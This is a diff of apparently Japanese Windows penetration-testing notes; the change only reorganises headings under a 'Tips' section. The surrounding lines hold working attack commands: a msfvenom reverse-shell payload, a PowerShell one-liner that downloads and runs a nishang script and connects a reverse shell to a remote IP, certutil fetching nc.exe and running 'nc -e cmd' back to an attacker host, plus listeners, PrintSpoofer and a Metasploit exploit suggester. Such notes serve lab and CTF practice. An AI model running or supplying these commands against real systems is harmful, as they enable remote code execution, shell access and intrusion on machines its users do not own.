@@ -2290,34 +2290,34 @@ PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが
 PrintSpoofer:  
 https://github.com/itm4n/PrintSpoofer.git
 
-
-## 侵入先情報の列挙
+## Tips
+### 侵入先情報の列挙
 ```
 systeminfo
 echo %username%
 ```
 
-## reverse_shell
-### msfvenom
+### reverse_shell
+#### msfvenom
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
 rlwrap nc -lvnp 4444
 ```
 
-### nishang
+#### nishang
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.252.239 -Port 4444
 
 rlwrap nc -lvnp 4444
 ```
 
-### netcatを転送
+#### netcatを転送
 ```
 certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
 C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
 ```
 
-## ファイルのダウンロード
+### ファイルのダウンロード
 ```
 curl http://10.10.10.1:9000/putty.exe -o putty.exe
 certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
@@ -2423,7 +2423,6 @@ meterpreterでシェルを取得している場合、これを使うことで特
 msf6 > use post/multi/recon/local_exploit_suggester
 ```
 
-## Tips
 ### evlilwinrm(5985)
 WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
 5985ポートが空いている時に使用。
